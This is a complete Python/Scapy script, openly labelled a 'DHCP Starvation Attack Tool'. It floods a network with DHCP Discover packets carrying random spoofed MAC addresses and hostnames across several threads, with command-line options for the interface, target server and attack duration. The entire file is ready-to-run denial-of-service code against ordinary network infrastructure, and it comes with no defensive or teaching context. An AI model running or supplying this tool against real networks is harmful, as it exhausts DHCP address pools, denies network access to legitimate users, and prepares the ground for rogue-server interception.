#!/usr/bin/env python3
from scapy.all import *
from random import randint
import time
import threading
import argparse
import ipaddress

def generate_random_mac():
    return ":".join([f"{randint(0x00, 0xff):02x}" for _ in range(6)])

def dhcp_starvation(interface, dhcp_server_ip, network_range, num_threads=5, duration=60):
    def starvation_thread():
        end_time = time.time() + duration
        while time.time() < end_time:
            # Generate random MAC and hostname for each request
            mac = generate_random_mac()
            hostname = f"fake-client-{randint(1, 10000)}"
            
            # Craft DHCP Discover packet
            dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                           IP(src="0.0.0.0", dst="255.255.255.255") / \
                           UDP(sport=68, dport=67) / \
                           BOOTP(chaddr=mac2str(mac), xid=randint(1, 0xFFFFFFFF)) / \
                           DHCP(options=[("message-type", "discover"),
                                        ("client_id", mac),
                                        ("hostname", hostname),
                                        ("param_req_list", [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
                                        "end"])
            
            # Send the packet
            sendp(dhcp_discover, iface=interface, verbose=0)
            time.sleep(0.01)  # Small delay to avoid overwhelming the system

    # Start multiple threads for more effective starvation
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=starvation_thread)
        t.start()
        threads.append(t)
    
    # Wait for all threads to complete
    for t in threads:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-s", "--server", required=True, help="Target DHCP server IP")
    parser.add_argument("-n", "--network", required=True, help="Network range to attack (e.g., 192.168.1.0/24)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    print(f"[*] Starting DHCP starvation attack on {args.server} via {args.interface}")
    print(f"[*] Using {args.threads} threads for {args.duration} seconds")
    
    dhcp_starvation(args.interface, args.server, args.network, args.threads, args.duration)
    
    print("[*] DHCP starvation attack completed")